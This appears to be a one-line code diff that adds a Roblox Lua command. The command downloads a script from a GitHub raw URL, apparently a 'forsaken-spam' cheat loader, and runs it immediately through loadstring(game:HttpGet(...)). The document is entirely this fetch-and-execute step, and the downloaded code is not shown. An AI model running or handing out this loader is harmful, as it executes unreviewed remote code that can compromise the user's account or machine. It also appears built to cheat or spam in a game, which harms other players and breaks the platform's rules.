@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/forsaken-spam6-5ja23g77lzqbww.lua"))()
